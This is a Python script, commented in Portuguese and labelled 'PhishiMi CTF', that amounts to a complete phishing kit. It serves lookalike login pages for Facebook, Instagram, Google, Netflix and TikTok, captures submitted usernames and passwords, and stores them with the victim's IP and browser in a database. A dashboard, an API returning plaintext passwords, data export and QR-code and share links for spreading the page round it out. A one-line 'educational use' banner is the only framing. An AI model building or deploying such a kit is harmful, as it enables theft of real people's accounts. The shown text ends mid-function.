#!/usr/bin/env python3
"""
PhishiMi CTF - Ferramenta completa e funcional
"""
import os
import sys
import json
import sqlite3
import threading
import time
import socket
import qrcode
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import webbrowser
from io import BytesIO
import base64

# ========== CONFIGURAÇÃO ==========
PORT = 8080
DASHBOARD_PORT = 8081
DB_FILE = "captures.db"
QR_DIR = "qrcodes"

# Criar diretórios
os.makedirs("templates", exist_ok=True)
os.makedirs("static", exist_ok=True)
os.makedirs(QR_DIR, exist_ok=True)

# ========== BANCO DE DADOS ==========
def init_database():
    """Inicializa o banco de dados SQLite"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Tabela de capturas
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  template TEXT,
                  username TEXT,
                  password TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    
    # Inserir dados de exemplo (apenas para teste)
    c.execute('''INSERT OR IGNORE INTO captures 
                 (template, username, password, ip, user_agent)
                 VALUES 
                 ('facebook', 'usuario_teste', 'senha123', '192.168.1.1', 'Mozilla/5.0'),
                 ('instagram', 'insta_user', 'insta_pass', '192.168.1.2', 'Chrome/120.0')''')
    
    conn.commit()
    conn.close()

def save_capture(template, username, password, ip, user_agent):
    """Salva captura no banco de dados"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT INTO captures 
                 (template, username, password, ip, user_agent)
                 VALUES (?, ?, ?, ?, ?)''',
              (template, username, password, ip, user_agent))
    conn.commit()
    conn.close()
    
    # Notificar sobre nova captura
    print(f"[+] Nova captura: {template} - {username}:{password}")

def get_all_captures():
    """Obtém todas as capturas"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''SELECT * FROM captures ORDER BY timestamp DESC LIMIT 50''')
    captures = c.fetchall()
    conn.close()
    return captures

def get_stats():
    """Obtém estatísticas"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Total de capturas
    c.execute('''SELECT COUNT(*) FROM captures''')
    total = c.fetchone()[0]
    
    # Capturas hoje
    c.execute('''SELECT COUNT(*) FROM captures 
                 WHERE DATE(timestamp) = DATE('now')''')
    today = c.fetchone()[0]
    
    # Capturas por template
    c.execute('''SELECT template, COUNT(*) FROM captures 
                 GROUP BY template ORDER BY COUNT(*) DESC''')
    by_template = dict(c.fetchall())
    
    conn.close()
    
    return {
        'total': total,
        'today': today,
        'by_template': by_template
    }

# ========== TEMPLATES ==========
def create_templates():
    """Cria os templates HTML"""
    templates = {
        'facebook': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Facebook - Entrar ou Cadastrar</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }
        .logo { color: #1877f2; font-size: 48px; font-weight: bold; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #1877f2; text-decoration: none; margin: 0 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <h2 style="text-align: center;">Entrar no Facebook</h2>
        <form method="POST" action="/facebook">
            <input type="text" name="email" placeholder="Email ou telefone" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
        <div class="links">
            <a href="#">Esqueceu a senha?</a> •
            <a href="#">Criar nova conta</a>
        </div>
    </div>
</body>
</html>''',

        'instagram': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        body { font-family: Arial; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 350px; }
        .logo { font-family: 'Brush Script MT', cursive; font-size: 48px; text-align: center; background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; background: #fafafa; font-size: 14px; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form method="POST" action="/instagram">
            <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>''',

        'google': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Google</title>
    <style>
        body { font-family: Arial; background: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { font-size: 32px; font-weight: normal; color: #5f6368; text-align: center; margin-bottom: 16px; }
        .logo span:nth-child(1) { color: #4285f4; }
        .logo span:nth-child(2) { color: #ea4335; }
        .logo span:nth-child(3) { color: #fbbc05; }
        .logo span:nth-child(4) { color: #4285f4; }
        .logo span:nth-child(5) { color: #34a853; }
        .logo span:nth-child(6) { color: #ea4335; }
        input { width: 100%; padding: 13px 15px; margin: 20px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        button { width: 100%; background: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h2 style="text-align: center; margin-bottom: 8px;">Fazer login</h2>
        <p style="text-align: center; color: #5f6368; margin-bottom: 24px;">Use sua Conta do Google</p>
        <form method="POST" action="/google">
            <input type="email" name="email" placeholder="E-mail ou telefone" required>
            <button type="submit">Próxima</button>
        </form>
    </div>
</body>
</html>''',

        'netflix': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Netflix</title>
    <style>
        body { background: #141414; color: white; font-family: Arial; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: rgba(0,0,0,0.75); padding: 60px 68px 40px; width: 450px; }
        .logo { color: #e50914; font-size: 48px; font-weight: bold; margin-bottom: 28px; }
        input { width: 100%; padding: 16px 20px; margin: 12px 0; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
        button { width: 100%; background: #e50914; color: white; border: none; padding: 16px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 24px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h2 style="margin-bottom: 28px;">Entrar</h2>
        <form method="POST" action="/netflix">
            <input type="text" name="email" placeholder="E-mail ou número de telefone" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>''',

        'tiktok': '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok</title>
    <style>
        body { font-family: Arial; background: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 400px; padding: 40px; }
        .logo { font-size: 36px; font-weight: bold; text-align: center; margin-bottom: 24px; }
        input { width: 100%; padding: 12px 16px; margin: 8px 0; border: 1px solid #e3e3e3; border-radius: 4px; font-size: 16px; }
        button { width: 100%; background: #000; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 16px 0; }
        .divider { text-align: center; margin: 20px 0; color: #8a8a8a; position: relative; }
        .divider::before, .divider::after { content: ""; position: absolute; top: 50%; width: 45%; height: 1px; background: #e3e3e3; }
        .divider::before { left: 0; }
        .divider::after { right: 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">TikTok</div>
        <h2 style="text-align: center; margin-bottom: 24px;">Log in to TikTok</h2>
        <form method="POST" action="/tiktok">
            <input type="text" name="username" placeholder="Username or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="divider">or continue with</div>
        <button style="background: #1877f2; margin-bottom: 8px;">Facebook</button>
        <button style="background: white; color: #333; border: 1px solid #e3e3e3;">Google</button>
    </div>
</body>
</html>'''
    }
    
    for name, content in templates.items():
        with open(f"templates/{name}.html", "w", encoding="utf-8") as f:
            f.write(content)

# ========== HANDLER PHISHING ==========
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Servidor com threading"""
    pass

class PhishingHandler(BaseHTTPRequestHandler):
    """Handler principal para phishing"""
    
    def do_GET(self):
        """Lida com requisições GET"""
        # Servir arquivos estáticos
        if self.path.startswith('/static/'):
            self.serve_static()
            return
        
        # Página inicial
        if self.path == '/':
            self.serve_home()
            return
        
        # Servir templates
        template = self.path.strip('/')
        if template in ['facebook', 'instagram', 'google', 'netflix', 'tiktok']:
            self.serve_template(template)
            return
        
        # Dashboard
        if self.path == '/dashboard':
            self.serve_dashboard()
            return
        
        # API para dashboard
        if self.path == '/api/captures':
            self.serve_captures_api()
            return
        
        if self.path == '/api/stats':
            self.serve_stats_api()
            return
        
        if self.path == '/qrcode':
            self.serve_qrcode()
            return
        
        self.send_error(404)
    
    def do_POST(self):
        """Processa logins falsos"""
        template = self.path.strip('/')
        if template not in ['facebook', 'instagram', 'google', 'netflix', 'tiktok']:
            self.send_error(404)
            return
        
        # Ler dados do formulário
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Parse dos dados
        data = parse_qs(post_data.decode('utf-8'))
        
        # Extrair credenciais
        username = ''
        password = ''
        
        for key, value in data.items():
            if key in ['email', 'username', 'user']:
                username = value[0]
            elif key in ['password', 'pass', 'pwd']:
                password = value[0]
        
        # Salvar no banco de dados
        if username or password:
            ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            save_capture(template, username, password, ip, user_agent)
        
        # Redirecionar para Google
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()
    
    def serve_static(self):
        """Serve arquivos estáticos"""
        try:
            filepath = self.path[1:]  # Remove '/'
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                
                # Tipo de conteúdo
                if filepath.endswith('.css'):
                    self.send_header('Content-type', 'text/css')
                elif filepath.endswith('.js'):
                    self.send_header('Content-type', 'application/javascript')
                elif filepath.endswith('.png'):
                    self.send_header('Content-type', 'image/png')
                elif filepath.endswith('.jpg') or filepath.endswith('.jpeg'):
                    self.send_header('Content-type', 'image/jpeg')
                else:
                    self.send_header('Content-type', 'text/plain')
                
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_error(404)
        except Exception as e:
            print(f"Erro ao servir estático: {e}")
            self.send_error(500)
    
    def serve_home(self):
        """Página inicial com seleção de templates"""
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>PhishiMi CTF - Selecione Template</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; }
        header { text-align: center; color: white; padding: 40px 0; }
        h1 { font-size: 3em; margin-bottom: 10px; }
        .subtitle { font-size: 1.2em; opacity: 0.9; }
        .templates-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 40px 0; }
        .template-card { background: white; border-radius: 15px; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transition: transform 0.3s; cursor: pointer; }
        .template-card:hover { transform: translateY(-10px); }
        .template-icon { font-size: 50px; margin-bottom: 20px; }
        .template-name { font-size: 1.5em; font-weight: bold; margin-bottom: 10px; }
        .facebook { color: #1877f2; }
        .instagram { background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .google { color: #4285f4; }
        .netflix { color: #e50914; }
        .tiktok { color: #000000; }
        .dashboard-btn { display: block; width: 200px; margin: 40px auto; padding: 15px; background: #4CAF50; color: white; text-align: center; text-decoration: none; border-radius: 25px; font-size: 1.2em; }
        .warning { text-align: center; color: white; margin-top: 50px; font-size: 0.9em; opacity: 0.8; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎣 PhishiMi CTF</h1>
            <div class="subtitle">Ferramenta Educacional de Simulação de Phishing</div>
        </header>
        
        <div class="templates-grid">
            <div class="template-card" onclick="window.location='/facebook'">
                <div class="template-icon facebook">f</div>
                <div class="template-name facebook">Facebook</div>
                <p>Simulação de login do Facebook</p>
            </div>
            
            <div class="template-card" onclick="window.location='/instagram'">
                <div class="template-icon instagram">📷</div>
                <div class="template-name instagram">Instagram</div>
                <p>Simulação de login do Instagram</p>
            </div>
            
            <div class="template-card" onclick="window.location='/google'">
                <div class="template-icon google">G</div>
                <div class="template-name google">Google</div>
                <p>Simulação de login do Google</p>
            </div>
            
            <div class="template-card" onclick="window.location='/netflix'">
                <div class="template-icon netflix">N</div>
                <div class="template-name netflix">Netflix</div>
                <p>Simulação de login do Netflix</p>
            </div>
            
            <div class="template-card" onclick="window.location='/tiktok'">
                <div class="template-icon tiktok">♪</div>
                <div class="template-name tiktok">TikTok</div>
                <p>Simulação de login do TikTok</p>
            </div>
        </div>
        
        <a href="/dashboard" class="dashboard-btn">📊 Acessar Dashboard</a>
        
        <div class="warning">
            ⚠️ Esta é uma ferramenta educacional. Use apenas em ambiente controlado com autorização.
        </div>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def serve_template(self, template):
        """Serve um template específico"""
        try:
            with open(f"templates/{template}.html", "rb") as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(content)
        except:
            self.send_error(404)
    
    def serve_dashboard(self):
        """Serve o dashboard"""
        html = self.generate_dashboard_html()
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def serve_captures_api(self):
        """API para obter capturas"""
        captures = get_all_captures()
        data = []
        
        for cap in captures:
            data.append({
                'id': cap[0],
                'template': cap[1],
                'username': cap[2],
                'password': cap[3],
                'ip': cap[4],
                'user_agent': cap[5],
                'timestamp': cap[6]
            })
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def serve_stats_api(self):
        """API para estatísticas"""
        stats = get_stats()
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stats).encode('utf-8'))
    
    def serve_qrcode(self):
        """Serve página com QR Code"""
        ip = get_local_ip()
        url = f"http://{ip}:{PORT}"
        
        # Gerar QR Code
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Converter para base64
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>QR Code - PhishiMi CTF</title>
    <style>
        body {{ font-family: Arial; text-align: center; padding: 50px; background: #f0f2f5; }}
        .container {{ max-width: 500px; margin: 0 auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }}
        h2 {{ color: #333; }}
        .qr-code {{ margin: 30px 0; }}
        .url-box {{ background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 20px 0; font-family: monospace; word-break: break-all; }}
        .btn {{ display: inline-block; background: #007bff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>📱 QR Code de Acesso</h2>
        <p>Escaneie este código com a câmera do seu celular para acessar a ferramenta:</p>
        
        <div class="qr-code">
            <img src="data:image/png;base64,{img_str}" alt="QR Code" style="width: 250px; height: 250px;">
        </div>
        
        <div class="url-box">
            <strong>URL:</strong> {url}
        </div>
        
        <a href="/dashboard" class="btn">📊 Voltar ao Dashboard</a>
        <a href="/" class="btn">🏠 Página Inicial</a>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def generate_dashboard_html(self):
        """Gera HTML do dashboard"""
        captures = get_all_captures()
        stats = get_stats()
        
        # HTML do dashboard
        html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhishiMi CTF - Dashboard</title>
    <link rel="stylesheet" href="/static/style.css">
    <script src="/static/script.js"></script>
    <style>
        :root {
            --primary: #007bff;
            --success: #28a745;
            --danger: #dc3545;
            --warning: #ffc107;
            --info: #17a2b8;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            color: #333;
        }
        
        .dashboard {
            display: flex;
            min-height: 100vh;
        }
        
        .sidebar {
            width: 250px;
            background: #2c3e50;
            color: white;
            padding: 20px 0;
        }
        
        .logo {
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #34495e;
        }
        
        .logo h1 {
            font-size: 1.5em;
            color: #3498db;
        }
        
        .nav-menu {
            list-style: none;
            margin-top: 30px;
        }
        
        .nav-menu li {
            padding: 15px 25px;
            transition: background 0.3s;
        }
        
        .nav-menu li:hover {
            background: #34495e;
        }
        
        .nav-menu a {
            color: white;
            text-decoration: none;
            display: flex;
            align-items: center;
        }
        
        .nav-menu i {
            margin-right: 10px;
            width: 20px;
        }
        
        .main-content {
            flex: 1;
            padding: 30px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .stats-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 5px;
            height: 100%;
        }
        
        .stat-card.total::before { background: var(--primary); }
        .stat-card.today::before { background: var(--success); }
        .stat-card.active::before { background: var(--warning); }
        
        .stat-card h3 {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .stat-card .value {
            font-size: 36px;
            font-weight: bold;
            color: #333;
        }
        
        .qr-section {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 30px;
            text-align: center;
        }
        
        #qrcode-img {
            width: 200px;
            height: 200px;
            margin: 20px auto;
            display: block;
        }
        
        .captures-table {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        thead {
            background: #f8f9fa;
        }
        
        th {
            padding: 15px;
            text-align: left;
            font-weight: 600;
            color: #495057;
            border-bottom: 2px solid #dee2e6;
        }
        
        td {
            padding: 15px;
            border-bottom: 1px solid #dee2e6;
        }
        
        .badge {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            color: white;
        }
        
        .badge.facebook { background: #1877f2; }
        .badge.instagram { background: #e4405f; }
        .badge.google { background: #4285f4; }
        .badge.netflix { background: #e50914; }
        .badge.tiktok { background: #000000; }
        
        .btn {
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 15px 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
            }
            
            .stats-cards {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <h1>🎣 PhishiMi CTF</h1>
                <p>Dashboard</p>
            </div>
            
            <ul class="nav-menu">
                <li><a href="/dashboard"><i>📊</i> Dashboard</a></li>
                <li><a href="/"><i>🏠</i> Página Inicial</a></li>
                <li><a href="/qrcode"><i>📱</i> QR Code</a></li>
                <li><a href="#stats"><i>📈</i> Estatísticas</a></li>
                <li><a href="#templates"><i>🎨</i> Templates</a></li>
                <li><a href="#settings"><i>⚙️</i> Configurações</a></li>
            </ul>
        </div>
        
        <!-- Conteúdo Principal -->
        <div class="main-content">
            <!-- Cabeçalho -->
            <div class="header">
                <h1><i>📊</i> Dashboard em Tempo Real</h1>
                <button class="btn btn-primary" onclick="loadData()">
                    <i>🔄</i> Atualizar
                </button>
            </div>
            
            <!-- Estatísticas -->
            <div class="stats-cards">
                <div class="stat-card total">
                    <h3><i>📊</i> Total de Capturas</h3>
                    <div class="value" id="total-captures">''' + str(stats['total']) + '''</div>
                </div>
                
                <div class="stat-card today">
                    <h3><i>📅</i> Capturas Hoje</h3>
                    <div class="value" id="today-captures">''' + str(stats['today']) + '''</div>
                </div>
                
                <div class="stat-card active">
                    <h3><i>⚡</i> Templates Ativos</h3>
                    <div class="value">5</div>
                </div>
            </div>
            
            <!-- QR Code -->
            <div class="qr-section">
                <h2><i>📱</i> Acesso por QR Code</h2>
                <img id="qrcode-img" src="" alt="QR Code">
                <p id="qr-url" style="color: #666; margin: 10px 0;"></p>
                <button class="btn btn-primary" onclick="downloadQR()">
                    <i>⬇️</i> Baixar QR Code
                </button>
                <button class="btn btn-success" onclick="shareURL()">
                    <i>📤</i> Compartilhar URL
                </button>
            </div>
            
            <!-- Tabela de Capturas -->
            <div class="captures-table">
                <div style="padding: 20px; border-bottom: 1px solid #dee2e6; display: flex; justify-content: space-between; align-items: center;">
                    <h2 style="margin: 0;"><i>📋</i> Últimas Capturas</h2>
                    <div>
                        <button class="btn btn-primary" onclick="exportData()">
                            <i>📥</i> Exportar
                        </button>
                        <button class="btn btn-danger" onclick="clearData()">
                            <i>🗑️</i> Limpar
                        </button>
                    </div>
                </div>
                
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Template</th>
                            <th>Usuário</th>
                            <th>Senha</th>
                            <th>IP</th>
                            <th>Data/Hora</th>
                        </tr>
                    </thead>
                    <tbody id="captures-body">'''
        
        # Adicionar capturas à tabela
        for capture in captures:
            password_display = '*' * len(capture[3]) if capture[3] else ''
            html += f'''
                        <tr>
                            <td>{capture[0]}</td>
                            <td><span class="badge {capture[1]}">{capture[1]}</span></td>
                            <td>{capture[2]}</td>
                            <td>{password_display}</td>
                            <td><code>{capture[4]}</code></td>
                            <td>{capture[6]}</td>
                        </tr>'''
        
        html += '''                    </tbody>
                </table>
            </div>
            
            <!-- Notificação -->
            <div class="notification" id="notification">
                Nova captura recebida!
            </div>
        </div>
    </div>
    
    <script>
        // Carregar dados iniciais
        document.addEventListener('DOMContentLoaded', function() {
            loadData();
            generateQRCode();
            
            // Auto-refresh a cada 5 segundos
            setInterval(loadData, 5000);
        });
        
        // Carregar dados
        async function loadData() {
            try {
                // Carregar estatísticas
                const statsRes = await fetch('/api/stats');
                const stats = await statsRes.json();
                
                document.getElementById('total-captures').textContent = stats.total;
                document.getElementById('today-captures').textContent = stats.today;
                
                // Carregar capturas
                const capturesRes = await fetch('/api/captures');
                const captures = await capturesRes.json();
                
                const tbody = document.getElementById('captures-body');
                tbody.innerHTML = '';
                
                captures.forEach(capture => {
                    const password = capture.password || '';
                    const passwordDisplay = '*'.repeat(password.length);
                    
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${capture.id}</td>
                        <td><span class="badge ${capture.template}">${capture.template}</span></td>
                        <td>${capture.username}</td>
                        <td>${passwordDisplay}</td>
                        <td><code>${capture.ip}</code></td>
                        <td>${capture.timestamp}</td>
                    `;
                    tbody.appendChild(row);
                });
                
            } catch (error) {
                console.error('Erro:', error);
            }
        }
        
        // Gerar QR Code
        function generateQRCode() {
            const currentUrl = window.location.origin.replace(':' + window.location.port, ':' + ''' + str(PORT) + ''');
            const qrUrl = `/qrcode?url=${encodeURIComponent(currentUrl)}`;
            
            document.getElementById('qrcode-img').src = qrUrl;
            document.getElementById('qr-url').textContent = currentUrl;
        }
        
        // Baixar QR Code
        function downloadQR() {
            const link = document.createElement('a');
            link.href = document.getElementById('qrcode-img').src;
            link.download = 'phishimi-qrcode.png';
            link.click();
        }
        
        // Compartilhar URL
        function shareURL() {
            const url = document.getElementById('qr-url').textContent;
            if (navigator.share) {
                navigator.share({
                    title: 'PhishiMi CTF',
                    text: 'Acesse a ferramenta de simulação',
                    url: url
                });
            } else {
                navigator.clipboard.writeText(url).then(() => {
                    showNotification('URL copiada!');
                });
            }
        }
        
        // Exportar dados
        function exportData() {
            fetch('/api/captures')
                .then(res => res.json())
                .then(data => {
                    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
                    const url = URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'phishimi-capturas.json';
                    link.click();
                    URL.revokeObjectURL(url);
                });
        }
        
        // Limpar dados
        function clearData() {
            if (confirm('Tem certeza que deseja limpar todos os dados?')) {
                fetch('/api/clear', {method: 'POST'})
                    .then(() => {
                        loadData();
                        showNotification('Dados limpos!');
                    });
            }
        }
        
        // Mostrar notificação
        function showNotification(message) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>'''
        
        return html

# ========== FUNÇÕES AUXILIARES ==========
def get_local_ip():
    """Obtém IP local da máquina"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def create_static_files():
    """Cria arquivos estáticos CSS e JS"""
    # CSS
    css = '''/* style.css - Arquivo CSS principal */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    background: #f8f9fa;
    color: #333;
}

a {
    color: #007bff;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

button {
    cursor: pointer;
    font-family: inherit;
}

.container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
}

.card {
    background: white;
    border-radius: 10px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    padding: 20px;
}

.btn {
    display: inline-block;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    font-size: 14px;
    font-weight: 500;
    transition: all 0.3s;
}

.btn-primary {
    background: #007bff;
    color: white;
}

.btn-primary:hover {
    background: #0056b3;
}

.btn-success {
    background: #28a745;
    color: white;
}

.btn-success:hover {
    background: #1e7e34;
}

.btn-danger {
    background: #dc3545;
    color: white;
}

.btn-danger:hover {
    background: #c82333;
}

.table {
    width: 100%;
    border-collapse: collapse;
}

.table th,
.table td {
    padding: 12px 15px;
    text-align: left;
    border-bottom: 1px solid #dee2e6;
}

.table th {
    background: #f8f9fa;
    font-weight: 600;
}

.badge {
    display: inline-block;
    padding: 5px 10px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
    color: white;
}

.badge.facebook { background: #1877f2; }
.badge.instagram { background: #e4405f; }
.badge.google { background: #4285f4; }
.badge.netflix { background: #e50914; }
.badge.tiktok { background: #000000; }

/* Responsividade */
@media (max-width: 768px) {
    .container {
        padding: 0 10px;
    }
    
    .table {
        display: block;
        overflow-x: auto;
    }
}'''
    
    with open("static/style.css", "w", encoding="utf-8") as f:
        f.write(css)
    
    # JavaScript
    js = '''// script.js - Funções JavaScript do dashboard

// Notificações
function showNotification(message, type = 'success') {
    const notification = document.getElementById('notification');
    if (!notification) return;
    
    notification.textContent = message;
    notification.className = 'notification ' + type;
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Atualizar contadores em tempo real
function updateStats() {
    fetch('/api/stats')
        .then(response => response.json())
        .then(stats => {
            document.getElementById('total-captures').textContent = stats.total;
            document.getElementById('today-captures').textContent = stats.today;
            
            // Atualizar gráfico de templates
            updateTemplateChart(stats.by_template);
        })
        .catch(error => console.error('Erro ao atualizar estatísticas:', error));
}

// Atualizar gráfico de templates
function updateTemplateChart(templateData) {
